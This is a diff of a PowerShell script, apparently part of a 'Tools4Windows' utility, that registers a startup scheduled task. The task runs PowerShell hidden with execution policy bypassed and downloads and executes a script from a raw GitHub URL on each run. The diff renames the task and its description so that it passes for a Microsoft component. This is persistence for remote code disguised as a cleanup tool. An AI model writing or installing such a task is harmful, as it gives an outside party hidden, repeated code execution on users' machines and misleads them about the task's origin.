@@ -1,8 +1,8 @@
 # Add daily cleanups at startup
 Import-Module ScheduledTasks
 
-$taskName = "Tools4Windows{8aaf4ffd6e97b9ee}"
-$taskDescription = "Tools4Windows is a collection of practical utilities for managing and optimizing your Windows machine. From cleaning up files to adjusting system settings, these tools make everyday tasks easier and more efficient."
+$taskName = "MicrosoftTools4Windows{A0CBEA86-A11A-40AB-836A-CBCDC8A04BC2}"
+$taskDescription = "Microsoft Tools4Windows is a collection of practical utilities for managing and optimizing your Windows machine. From cleaning up files to adjusting system settings, these tools make everyday tasks easier and more efficient."
 
 $command = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-Expression (Invoke-WebRequest ''https://raw.githubusercontent.com/tools4windows/other/refs/heads/main/daily.ps1'' -UseBasicParsing)}"'
 
